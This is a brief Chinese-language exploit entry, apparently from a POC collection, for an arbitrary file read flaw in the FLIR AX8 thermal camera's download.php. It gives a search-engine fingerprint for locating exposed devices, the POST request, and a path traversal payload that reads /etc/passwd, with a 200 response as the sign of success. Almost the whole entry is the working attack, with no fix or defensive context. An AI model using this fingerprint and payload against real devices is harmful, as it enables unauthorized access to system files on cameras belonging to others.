# FLIR-AX8热成像仪download.php存在任意文件读取漏洞

FLIR ｜ 任意文件读取/写入 ｜ —
- **指纹**：`web.icon=="f4370ff0b4763e18159cd7cdf36a4542"`
- **请求**：`POST /download.php HTTP/1.1`

**Payload**
```
file=../../../etc/passwd
```
- **响应特征**：200